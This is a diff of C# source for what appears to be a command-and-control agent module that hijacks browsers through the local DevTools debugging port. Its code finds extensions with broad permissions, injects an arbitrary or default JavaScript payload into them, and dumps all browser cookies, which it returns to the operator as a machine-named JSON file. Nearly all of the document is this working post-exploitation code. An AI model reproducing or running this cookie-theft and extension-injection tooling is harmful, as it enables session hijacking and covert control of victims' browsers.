@@ -29,12 +29,12 @@ namespace Agent
         {
             CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);
 
-            if(args.debug_port > 0)
+            if (args.debug_port > 0)
             {
                 this.config.debug_port = args.debug_port.ToString();
             }
 
-            if(args.parent > 0)
+            if (args.parent > 0)
             {
                 this.config.parent = args.parent;
             }
@@ -49,238 +49,40 @@ namespace Agent
                 this.config.target = args.target;
             }
         }
-        private async Task CChrome(string payload, string task_id)
+        public async Task HandleNextMessage(ServerResponseResult response)
         {
-            //Parse for chosen browser
-            ReturnOutput("[+] Getting extensions", task_id);
-            var extensions = await GetExtensions();
-
-            if (extensions.Count <= 0)
+            if (!this.cookiesOut.ContainsKey(response.task_id))
             {
-                //No extensions installed
-                ReturnOutput("[!] No extensions found", task_id);
                 return;
             }
 
-            ReturnOutput($"[+] Got {extensions.Count} extensions, enumerating for potential injection candidates.", task_id);
-
-            List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();
-
-            foreach (var extension in extensions)
+            DownloadResponse dr = new DownloadResponse()
             {
-                ExtensionManifest manifest = await GetManifestFromExtension(extension);
-
-                if (manifest is null)
+                task_id = response.task_id,
+                download = new DownloadResponseData
                 {
-                    continue;
-                }
+                    total_chunks = 1,
+                    is_screenshot = false,
+                    filename = $"{Environment.MachineName}-cookies.json",
+                    host = "",
+                    chunk_num = 1,
+                    chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
+                    file_id = response.file_id,
+                },
+            };
 
-                var permissions = GetPermissionsFromManifest(manifest);
+            await this.messageManager.AddResponse(dr.ToJson());
 
-                if (permissions.Count == 0)
-                {
-                    continue;
-                }
-
-
-                if (Misc.CheckListValues(permissions, main_permissions) || Misc.CheckListValues(alt_permissions, permissions))
-                {
-                    extensionCandidates.Add(extension);
-                }
-
-            }
-
-            if (extensionCandidates.Count <= 0)
-            {
-                ReturnOutput("[!] Didn't find any good extension candidates.", task_id);
-                return;
-            }
-
-            ReturnOutput($"[+] Found {extensionCandidates.Count} candidates!", task_id);
-
-            if (string.IsNullOrEmpty(payload))
-            {
-                if (string.IsNullOrEmpty(this.config.target))
-                {
-                    ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
-                    return;
-                }
-                payload = this.config.GetDefaultPayload();
-            }
-
-            ReturnOutput("[+] Injecting our payload", task_id);
-            foreach (var extension in extensionCandidates)
-            {
-                if(this.TryInjectJs(extension, payload, out var response))
-                {
-                    ReturnOutput("[+] Succesfully injected payload.", task_id);
-                    ReturnOutput($"Response: {response}", task_id);
-                    return;
-                }
-                ReturnOutput("[!] Failed to innject payload.", task_id);
-                ReturnOutput($"Response: {response}", task_id);
-            }
-        }
-        private async Task<List<ChromeJsonObject>> GetExtensions()
-        {
-            List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
-            using (HttpClient client = new HttpClient())
-            {
-                try
-                {
-                    // Fetch list of targets from DevTools Protocol
-                    string targetsUrl = $"http://localhost:{this.config.debug_port}/json/list";
-                    string targetsJson = await client.GetStringAsync(targetsUrl);
-
-                    List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);
-
-                    foreach (var target in targets)
-                    {
-                        if (target.url.StartsWith("chrome-extension"))
-                        {
-                            extensions.Add(target);
-                        }
-                    }
-                }
-                catch (HttpRequestException)
-                {
-                }
-            }
-            return extensions;
-        }
-        private async Task<string> InjectJs(string id, string jsCode)
-        {
-            var extensions = await GetExtensions();
-
-            foreach(var extension in extensions)
-            {
-                if(extension.id == id)
-                {
-                    return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl));
-                }
-            }
-            return "Failed to identify specified extension.";
-        }
-        private bool TryInjectJs(ChromeJsonObject extension, string jsCode, out string response)
-        {
-            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl)).Result;
-            return true;
-        }
-        private async Task<string> InjectJs(string jsCode, Uri uri)
-        {
-            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
-            {
-                await webSocket.ConnectAsync(uri, System.Threading.CancellationToken.None);
-
-                // Build the DevTools Protocol message to execute JavaScript
-                var message = new
-                {
-                    id = 1,
-                    method = "Runtime.evaluate",
-                    @params = new
-                    {
-                        expression = jsCode,
-                        returnByValue = true
-                    }
-                };
-
-                // Convert the message to JSON and send it to the WebSocket
-                string messageJson = JsonSerializer.Serialize(message);
-                await WebSocketHelper.SendMessage(webSocket, messageJson);
-
-                return await WebSocketHelper.ReceiveMessage(webSocket);
-            }
-        }
-        private async Task<bool> TryGetCookies(string task_id)
-        {
-
-            List<ChromeJsonObject> extensions = this.GetExtensions().Result;
-
-            if(extensions.Count == 0)
-            {
-                return false;
-            }
-
-            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
-            {
-                // Connect to Chrome's WebSocket debugger
-                //Need to confirm if this is an okay value
-                await webSocket.ConnectAsync(new Uri(extensions.First().webSocketDebuggerUrl), System.Threading.CancellationToken.None);
-
-                // Send a message to request cookies
-                var message = new
-                {
-                    id = 1,
-                    method = "Network.getAllCookies",
-                };
-                //Send our request
-                string messageJson = JsonSerializer.Serialize(message);
-                await WebSocketHelper.SendMessage(webSocket, messageJson);
-                
-                //Wait for a response
-                string response = await WebSocketHelper.ReceiveMessage(webSocket);
-
-                //Get rid of the nonsense double result stuff
-                JsonDocument responseJsonDocument = JsonDocument.Parse(response);
-                JsonElement responseRoot = responseJsonDocument.RootElement;
-
-                if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
-                {
-                    //Strip outer edge, leaving only the good inside
-                    this.cookiesOut.Add(task_id, resultElement.GetRawText());
-                    ReturnOutput("[+] Returning parsed cookies file", task_id);
-                    await StartSendFile(task_id);
-                    return true;
-                }
-
-                //Something fucked up, so just return the raw response
-                ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
-                this.cookiesOut.Add(task_id, resultElement.GetRawText());
-                await StartSendFile(task_id);
-                return false;
-            }
-        }
-        private async Task<ExtensionManifest> GetManifestFromExtension(ChromeJsonObject extension)
-        {
-            //string response = await InjectJs(extension.id,"chrome.runtime.getManifest()");
-            string response = String.Empty;
-
-            if(TryInjectJs(extension, "chrome.runtime.getManifest()", out response))
-            {
-                JsonDocument responseJsonDocument = JsonDocument.Parse(response);
-                JsonElement responseRoot = responseJsonDocument.RootElement;
-
-                if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
-                {
-                    return JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
-                }
-            }
-
-            return new ExtensionManifest();
-        }
-        private List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
-        {
-            List<string> permissions = new List<string>();
-            foreach (var permission in manifest.result.value.permissions)
-            {
-                permissions.Add(permission);
-            }
-
-            return permissions;
+            this.cookiesOut.Remove(response.task_id);
         }
         public async void Interact(InteractMessage message)
         {
             string user_input = Misc.Base64Decode(message.data).TrimEnd(Environment.NewLine.ToCharArray());
-            var inputParts =  Misc.SplitCommandLine(user_input);
+            var inputParts = Misc.SplitCommandLine(user_input);
             switch (inputParts[0])
             {
                 case "cursed":
-                    if (inputParts.Length < 2)
-                    {
-                        ReturnOutput("Please specify a browser", message.task_id);
-                        break;
-                    }
-                    await this.Cursed(inputParts[1], message.task_id);
+                    await this.Cursed(this.config.payload, message.task_id);
                     break;
                 case "cookies":
                     await this.TryGetCookies(message.task_id);
@@ -302,28 +104,28 @@ namespace Agent
                     await this.SetConfig(inputParts[1], value, message.task_id);
                     break;
                 case "inject-js":
-                    if(inputParts.Count() < 3)
+                    if (inputParts.Count() < 3)
                     {
-                        ReturnOutput("Please specify both an ID and a payload", message.task_id);
+                        await ReturnOutput("Please specify both an ID and a payload", message.task_id);
                         break;
                     }
 
-                    var res = await this.InjectJs(inputParts[1], inputParts[2]);
+                    var res = await DebugHelper.InjectJs(inputParts[1], inputParts[2], config);
                     break;
                 case "spawn":
 
-                    if(inputParts.Length < 2)
+                    if (inputParts.Length < 2)
                     {
-                        ReturnOutput("Please specify a browser.", message.task_id);
-                        return;
+                        await ReturnOutput("Please specify a browser.", message.task_id);
+                        break;
                     }
 
-                    if (!await SpawnElectron(inputParts[1], user_input, message.task_id))
+                    if (!await Spawn(inputParts[1], user_input, message.task_id))
                     {
-                        ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
-                        return;
+                        await ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
+                        break;
                     }
-                    ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
+                    await ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
                     break;
                 case "exit":
                     this.config = new CursedConfig();
@@ -338,13 +140,115 @@ namespace Agent
                     await this.messageManager.AddResponse(new InteractMessage()
                     {
                         task_id = message.task_id,
-                        data = Misc.Base64Encode(GetHelpText() + Environment.NewLine),
+                        data = Misc.Base64Encode(CommandParser.GetHelpText() + Environment.NewLine),
                         message_type = InteractiveMessageType.Output,
                     });
                     break;
             }
         }
-        private async Task<bool> SpawnElectron(string choice, string full_cmdline, string task_id)
+        private async Task Cursed(string payload, string task_id)
+        {
+            //Parse for chosen browser
+            await ReturnOutput("[+] Getting extensions", task_id);
+            var extensions = await DebugHelper.GetExtensions(this.config);
+
+            if (extensions.Count <= 0)
+            {
+                //No extensions installed
+                await ReturnOutput("[!] No extensions found", task_id);
+                return;
+            }
+
+            await ReturnOutput($"[+] Got {extensions.Count} extensions, enumerating for potential injection candidates.", task_id);
+
+            List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();
+
+            foreach (var extension in extensions)
+            {
+                if (!DebugHelper.TryGetManifestFromExtension(extension, task_id, out var manifest) || manifest is null)
+                {
+                    continue;
+                }
+
+                var permissions = DebugHelper.GetPermissionsFromManifest(manifest);
+
+                if (permissions.Count == 0)
+                {
+                    continue;
+                }
+
+                if (Misc.CheckListValues(permissions, main_permissions) || Misc.CheckListValues(alt_permissions, permissions))
+                {
+                    extensionCandidates.Add(extension);
+                }
+
+            }
+
+            if (extensionCandidates.Count <= 0)
+            {
+                await ReturnOutput("[!] Didn't find any good extension candidates.", task_id);
+                return;
+            }
+
+            await ReturnOutput($"[+] Found {extensionCandidates.Count} candidates!", task_id);
+
+            if (string.IsNullOrEmpty(payload))
+            {
+                if (string.IsNullOrEmpty(this.config.target))
+                {
+                    await ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
+                    return;
+                }
+                payload = this.config.GetDefaultPayload();
+            }
+
+            await ReturnOutput("[+] Injecting our payload", task_id);
+            foreach (var extension in extensionCandidates)
+            {
+                if (DebugHelper.TryInjectJs(extension, payload, out var response))
+                {
+                    await ReturnOutput("[+] Succesfully injected payload." + Environment.NewLine + $"Response: {response}", task_id);
+                    return;
+                }
+                await ReturnOutput("[!] Failed to inject payload." + Environment.NewLine + $"Response: {response}", task_id);
+            }
+        }
+        private async Task<bool> TryGetCookies(string task_id)
+        {
+            List<ChromeJsonObject> extensions = await DebugHelper.GetExtensions(this.config);
+
+            if (extensions.Count == 0)
+            {
+                return false;
+            }
+
+            string response = await DebugHelper.InjectGetAllCookies(extensions.First());
+
+            if (string.IsNullOrEmpty(response))
+            {
+                await ReturnOutput("[!] Failed to inject JS for cookies request", task_id);
+                return false;
+            }
+
+            JsonDocument responseJsonDocument = JsonDocument.Parse(response);
+            JsonElement responseRoot = responseJsonDocument.RootElement;
+
+            if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
+            {
+                //Strip outer edge, leaving only the good inside
+                await ReturnOutput("[+] Returning parsed cookies file", task_id);
+                this.cookiesOut.Add(task_id, resultElement.GetRawText());
+                await StartSendFile(task_id);
+                return true;
+            }
+
+            //Something fucked up, so just return the raw response
+            await ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
+            this.cookiesOut.Add(task_id, response);
+            await StartSendFile(task_id);
+            return false;
+        }
+        private async Task<bool> Spawn(string choice, string full_cmdline, string task_id)
         {
             string commandline = string.Empty;
 
@@ -377,31 +281,6 @@ namespace Agent
 
             return await spawner.Spawn(opts);
         }
-        private async Task<bool> Cursed(string choice, string task_id)
-        {
-            if (string.IsNullOrEmpty(this.config.payload) && string.IsNullOrEmpty(this.config.target))
-            {
-                ReturnOutput("Please ensure either a payload or target is specified", task_id);
-                return false;
-            }
-
-            if(string.IsNullOrEmpty(this.config.payload) && !string.IsNullOrEmpty(this.config.target))
-            {
-                this.config.payload = this.config.GetDefaultPayload();
-            }
-
-            switch (choice.ToLower())
-            {
-                case "chrome":
-                     await CChrome(this.config.payload, task_id);
-                    break;
-                case "edge":
-                    break;
-                default:
-                    return false;
-            }
-            return true;
-        }
         private async Task SetConfig(string choice, string value, string task_id)
         {
             Type type = config.GetType();
@@ -414,11 +293,11 @@ namespace Agent
                 else
                     property.SetValue(config, value);
 
-                ReturnOutput("Set " + choice + " to " + value, task_id);
+                await ReturnOutput("Set " + choice + " to " + value, task_id);
             }
             else
             {
-                ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
+                await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
             }
         }
         private async Task GetValue(string choice, string task_id)
@@ -426,8 +305,8 @@ namespace Agent
             switch (choice.ToLower())
             {
                 case "extensions":
-                    var extensions = await this.GetExtensions();
-                    ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
+                    var extensions = await DebugHelper.GetExtensions(this.config);
+                    await ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
                     break;
                 case "":
                 case null:
@@ -435,11 +314,11 @@ namespace Agent
                     {
                         if (prop.GetValue(config) is null)
                         {
-                            ReturnOutput($"{prop.Name}: <empty>", "");
+                            await ReturnOutput($"{prop.Name}: <empty>", "");
                         }
                         else
                         {
-                            ReturnOutput($"{prop.Name}: {prop.GetValue(config).ToString()}", task_id);
+                            await ReturnOutput($"{prop.Name}: {prop.GetValue(config).ToString()}", task_id);
                         }
 
                     }
@@ -451,7 +330,7 @@ namespace Agent
                         var property = type.GetProperty(choice);
                         if(property is null)
                         {
-                            ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
+                            await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                             return;
                         }
 
@@ -459,77 +338,20 @@ namespace Agent
 
                         if(propVal is null)
                         {
-                            ReturnOutput($"{choice}: <empty>", task_id);
+                            await ReturnOutput($"{choice}: <empty>", task_id);
                             return;
                         }
 
-                        ReturnOutput($"{choice}: {propVal}", task_id);
+                        await ReturnOutput($"{choice}: {propVal}", task_id);
                     }
                     catch
                     {
-                        ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
+                        await ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                     }
                 break;
 
             }
-        }
-        private string GetHelpText()
-        {
-            return """
-    Commands:
-        cursed [chrome|edge]
-            Enumerates a spawned electron process via the local debugging port for extensions with permissions suitable for CursedChrome. 
-                If a payload is specified it will use that, if not, it will use the built-in payload with the target setting 
-
-        set [config] [value]
-            Set's a configuration value. For cursed commands
-                set debug_port 2020 //Set's the port to be used for the electron debug port
-                set payload <payload> //Sets the payload to be used
-                set target ws[s]://target:port //Sets the target for the default payload, this parameter is ignored if the payload has been manually set
-                set cmdline "--user-data-dir=C:\\Users\\checkymander\\"
-                set parent <pid>
-
-        get [target|payload|extensions|debug-port]
-            Get's the value of the configuration parameter and prints it to output
-""";
-        }
-        private async void ReturnOutput(string message, string task_id)
-        {
-            await this.messageManager.AddResponse(new InteractMessage()
-            {
-                task_id = task_id,
-                data = Misc.Base64Encode(message + Environment.NewLine),
-                message_type = InteractiveMessageType.Output,
-            });
-        }
-        public async Task HandleNextMessage(ServerResponseResult response)
-        {
-            Console.WriteLine("Starting handlenextmessage");
-
-            if (!this.cookiesOut.ContainsKey(response.task_id))
-            {
-                return;
-            }
-
-            DownloadResponse dr = new DownloadResponse()
-            {
-                task_id = response.task_id,
-                download = new DownloadResponseData
-                {
-                    total_chunks = 1,
-                    is_screenshot = false,
-                    filename = $"{Environment.MachineName}-cookies.json",
-                    host = "",
-                    chunk_num = 1,
-                    chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
-                    file_id = response.file_id,
-                },
-            };
-
-            await this.messageManager.AddResponse(dr.ToJson());
-
-            this.cookiesOut.Remove(response.task_id);
-        }
+        } 
         private async Task StartSendFile(string task_id)
         {
             await messageManager.AddResponse(new DownloadResponse
@@ -544,6 +366,15 @@ namespace Agent
                 },
                 task_id = task_id,
             }.ToJson());
+        }
+        private async Task ReturnOutput(string message, string task_id)
+        {
+            await this.messageManager.AddResponse(new InteractMessage()
+            {
+                task_id = task_id,
+                data = Misc.Base64Encode(message + Environment.NewLine),
+                message_type = InteractiveMessageType.Output,
+            });
         }
     }
 }
